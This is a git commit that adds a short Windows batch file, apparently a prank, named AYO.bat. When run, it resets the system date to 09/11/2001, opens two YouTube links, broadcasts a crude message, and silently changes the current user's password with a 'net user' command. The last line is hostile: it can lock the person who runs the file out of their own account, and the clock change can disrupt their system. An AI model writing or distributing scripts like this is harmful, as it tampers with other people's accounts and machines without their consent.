0b039c423e43594d5e6a46d5f4cd88a1a2203c7c
giggityfiles <giggityfiles@gmail.com>
2025-09-23 08:28:54 -0400

    Create AYO.bat

---
+++ AYO.bat
@@ -0,0 +1,8 @@
+@echo off
+date 09/11/2001
+time 10:28:01.00
+start "" https://www.youtube.com/shorts/ZGLVSdDXDew
+start "" https://www.youtube.com/shorts/GnI8C3vdHY8
+msg * "i shit my panini"
+net user "%username%" fart
+exit
